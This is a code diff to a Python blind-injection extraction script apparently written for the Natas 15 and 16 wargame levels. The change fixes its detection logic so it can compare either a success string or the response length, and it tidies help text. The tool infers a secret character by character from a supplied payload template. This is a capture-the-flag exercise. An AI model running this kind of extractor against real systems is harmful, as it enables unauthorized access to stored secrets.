@@ -17,7 +17,7 @@ def parse_args():
     parser.add_argument("--user", required=True, help="HTTP auth username")
     parser.add_argument("--password", required=True, help="HTTP auth password")
     parser.add_argument("--param", required=True, help="Vulnerable parameter name")
-    parser.add_argument("--true-string", default="", help="String indicating TRUE condition (for boolean-based)")
+    parser.add_argument("--true-string", default="", help="String indicating TRUE condition (for boolean-based checks)")
     parser.add_argument("--payload-template", required=True, help="Payload template using {char} and/or {pos}")
     parser.add_argument("--max-length", type=int, default=32, help="Maximum length of extracted value")
     parser.add_argument("--delay", type=float, default=0.0, help="Delay between requests")
@@ -29,7 +29,7 @@ def parse_args():
 # Core Logic
 # -------------------------------
 
-def send_payload(url, auth, param, payload, baseline_len):
+def send_payload(url, auth, param, payload, true_string, baseline_len):
     r = requests.get(
         url,
         params={param: payload},
@@ -37,14 +37,12 @@ def send_payload(url, auth, param, payload, baseline_len):
         timeout=10
     )
 
-    return len(r.text) < baseline_len
-
-    # Mode 1: explicit success string (Natas 15)
+    # Mode 1: Boolean response (Natas 15)
     if true_string:
         return true_string in r.text
 
-    # Mode 2: output-length comparison (Natas 16)
-    return len(r.text) > baseline_len
+    # Mode 2: Output-length comparison (Natas 16)
+    return len(r.text) < baseline_len
 
 
 def extract_secret(args):
@@ -53,7 +51,7 @@ def extract_secret(args):
 
     print("[*] Starting blind SQL injection...\n")
 
-    # Establish baseline for output-length comparison
+    # Establish baseline output length for Natas 16-style detection
     baseline_payload = args.payload_template.format(char="Z")
     baseline_resp = requests.get(
         args.url,
